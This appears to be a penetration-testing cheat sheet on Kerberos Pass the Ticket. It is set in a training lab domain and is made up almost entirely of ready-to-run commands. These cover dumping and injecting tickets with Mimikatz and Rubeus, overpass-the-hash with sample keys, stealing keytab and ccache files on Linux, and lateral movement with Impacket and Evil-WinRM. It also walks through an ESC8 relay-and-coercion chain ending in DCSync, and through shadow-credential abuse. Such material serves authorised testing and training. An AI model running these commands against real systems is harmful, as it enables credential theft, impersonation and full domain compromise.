---
title: Pass the Ticket (PtT)
tags: [password-attacks, pass-the-ticket, kerberos, mimikatz, rubeus, ccache, keytab, linikatz, pass-the-certificate, lateral-movement, active-directory]
---

# Pass the Ticket (PtT)

> PtT steals Kerberos tickets and injects them into the current session — authentication happens as the ticket's owner without knowing their password.

## Kerberos Refresher

- **TGT (Ticket Granting Ticket)** — obtained at login by encrypting a timestamp with the user's hash. Used to request service tickets.
- **TGS (Ticket Granting Service)** — issued per-service. Presented to the service for authentication.
- Tickets are stored and managed by LSASS on Windows.

---

## Harvesting Tickets (Windows)

### Mimikatz — Export all tickets to .kirbi files

```powershell
mimikatz # privilege::debug
mimikatz # sekurlsa::tickets /export
# Creates .kirbi files in current directory
dir *.kirbi
```

> Tickets ending with `$` = machine account. User tickets: `[value]-username@service-domain.local.kirbi`. TGT tickets have `krbtgt` as the service.

### Rubeus — Dump tickets (no export to disk)

```powershell
Rubeus.exe dump /nowrap
```

---

## OverPass the Hash / Pass the Key

Converts an NTLM hash or AES key into a TGT — useful when NTLM is restricted.

### Extract Kerberos Encryption Keys

```powershell
mimikatz # privilege::debug
mimikatz # sekurlsa::ekeys
# Look for AES256_HMAC or RC4_HMAC keys
```

### Mimikatz — Pass the Key

```powershell
mimikatz # privilege::debug
mimikatz # sekurlsa::pth /domain:inlanefreight.htb /user:plaintext /ntlm:3f74aa8f08f712f09cd5177b5c1ce50f
# Opens a new cmd.exe in the user's context
```

### Rubeus — OverPass the Hash (request TGT directly)

```powershell
Rubeus.exe asktgt /domain:inlanefreight.htb /user:plaintext \
  /aes256:b21c99fc068e3ab2ca789bccbef67de43791fd911c6e15ead25641a8fda3fe60 /nowrap
```

!!! info
    Rubeus does **not** require admin privileges for `asktgt`; Mimikatz does.

---

## Injecting Tickets (Windows)

### Rubeus — Pass the Ticket

```powershell
# From OverPass the Hash output — use /ptt to inject directly
Rubeus.exe asktgt /domain:inlanefreight.htb /user:plaintext \
  /rc4:3f74aa8f08f712f09cd5177b5c1ce50f /ptt

# From a .kirbi file
Rubeus.exe ptt /ticket:[0;6c680]-2-0-40e10000-plaintext@krbtgt-inlanefreight.htb.kirbi

# Convert .kirbi to base64, then inject
[Convert]::ToBase64String([IO.File]::ReadAllBytes("ticket.kirbi"))
Rubeus.exe ptt /ticket:<base64text>

# Verify
dir \\DC01.inlanefreight.htb\c$
```

### Mimikatz — Pass the Ticket

```powershell
mimikatz # privilege::debug
mimikatz # kerberos::ptt "C:\Users\plaintext\Desktop\[0;6c680]-2-0-40e10000-plaintext@krbtgt-inlanefreight.htb.kirbi"
exit
dir \\DC01.inlanefreight.htb\c$
```

---

## PtT with PowerShell Remoting

### Mimikatz → PSRemoting

```powershell
# 1. Import ticket in cmd.exe
mimikatz # kerberos::ptt "C:\Users\Administrator.WIN01\Desktop\[0;1812a]-2-0-40e10000-john@krbtgt-INLANEFREIGHT.HTB.kirbi"
exit

# 2. Launch PowerShell from same session
powershell
Enter-PSSession -ComputerName DC01
```

### Rubeus → PSRemoting

```powershell
# Create sacrificial process (equivalent to runas /netonly)
Rubeus.exe createnetonly /program:"C:\Windows\System32\cmd.exe" /show

# In the new cmd window, request TGT and inject
Rubeus.exe asktgt /user:john /domain:inlanefreight.htb \
  /aes256:9279bcbd40db957a0ed0d3856b2e67f9bb58e6dc7fc07207d0763ce2713f11dc /ptt
powershell
Enter-PSSession -ComputerName DC01
```

---

## Pass the Ticket from Linux

Linux machines joined to AD use Kerberos tickets stored as:
- **ccache files** — `/tmp/krb5cc_<id>`, path in `$KRB5CCNAME`
- **keytab files** — static key files for services/cron jobs

### Identify AD Integration

```bash
realm list
ps -ef | grep -i "winbind\|sssd"
```

### Find Tickets

```bash
# Find keytab files
find / -name *keytab* -ls 2>/dev/null
crontab -l    # scripts may reference .keytab files

# Find ccache files
env | grep -i krb5
ls -la /tmp
```

### Abuse Keytab Files

```bash
# List keytab contents
klist -k -t /opt/specialfiles/carlos.keytab

# Impersonate user with kinit
kinit carlos@INLANEFREIGHT.HTB -k -t /opt/specialfiles/carlos.keytab
klist    # verify ticket is loaded
```

### Extract Hash from Keytab (KeyTabExtract)

```bash
python3 /opt/keytabextract.py /opt/specialfiles/carlos.keytab
# Returns NTLM hash → use for PtH or crack with Hashcat
```

### Abuse ccache Files (requires root)

```bash
ls -la /tmp                              # find ccache files
cp /tmp/krb5cc_647401106_I8I133 .
export KRB5CCNAME=/root/krb5cc_647401106_I8I133
klist                                    # verify
```

### Use Tickets with Attack Tools

```bash
# /etc/hosts must resolve DC hostname
# /etc/proxychains.conf must route through pivot if no direct KDC access

# Impacket (use hostname, not IP; -k = Kerberos auth)
proxychains impacket-wmiexec dc01 -k

# Evil-WinRM with Kerberos
sudo apt-get install krb5-user -y
# Edit /etc/krb5.conf:
#   default_realm = INLANEFREIGHT.HTB
#   [realms] INLANEFREIGHT.HTB = { kdc = dc01.inlanefreight.htb }
proxychains evil-winrm -i dc01 -r inlanefreight.htb

# Convert ccache ↔ kirbi
impacket-ticketConverter krb5cc_647401106_I8I133 julio.kirbi
```

### Linikatz — Mimikatz for Linux AD

```bash
wget https://raw.githubusercontent.com/CiscoCXSecurity/linikatz/master/linikatz.sh
/opt/linikatz.sh
```

---

## Pass the Certificate

Uses X.509 certificates to obtain TGTs. Primarily used with AD CS attacks.

### ESC8 — NTLM Relay to ADCS Web Enrollment

```bash
# 1. Start NTLM relay targeting the CA
impacket-ntlmrelayx -t http://10.129.234.110/certsrv/certfnsh.asp \
  --adcs -smb2support --template KerberosAuthentication

# 2. Coerce DC authentication (printer bug)
python3 printerbug.py INLANEFREIGHT.LOCAL/wwhite:"password"@10.129.234.109 10.10.16.12

# 3. Use obtained certificate to get TGT
git clone https://github.com/dirkjanm/PKINITtools.git && cd PKINITtools
python3 -m venv .venv && source .venv/bin/activate
pip3 install -r requirements.txt

python3 gettgtpkinit.py -cert-pfx ../krbrelayx/DC01\$.pfx \
  -dc-ip 10.129.234.109 'inlanefreight.local/dc01$' /tmp/dc.ccache

# 4. Use the TGT for DCSync
export KRB5CCNAME=/tmp/dc.ccache
impacket-secretsdump -k -no-pass -dc-ip 10.129.234.109 \
  -just-dc-user Administrator 'INLANEFREIGHT.LOCAL/DC01$'@DC01.INLANEFREIGHT.LOCAL
```

### Shadow Credentials (msDS-KeyCredentialLink)

Requires write access to a user's `msDS-KeyCredentialLink` attribute (shown as `AddKeyCredentialLink` edge in BloodHound).

```bash
# Add a certificate to the victim's msDS-KeyCredentialLink
pywhisker --dc-ip 10.129.234.109 -d INLANEFREIGHT.LOCAL \
  -u wwhite -p 'password' --target jpinkman --action add
# Output: PFX file + password

# Get TGT as victim using the PFX
python3 gettgtpkinit.py -cert-pfx ../eFUVVTPf.pfx \
  -pfx-pass 'bmRH4LK7UwPrAOfvIx6W' \
  -dc-ip 10.129.234.109 INLANEFREIGHT.LOCAL/jpinkman /tmp/jpinkman.ccache

# Pass the Ticket
export KRB5CCNAME=/tmp/jpinkman.ccache
klist
```
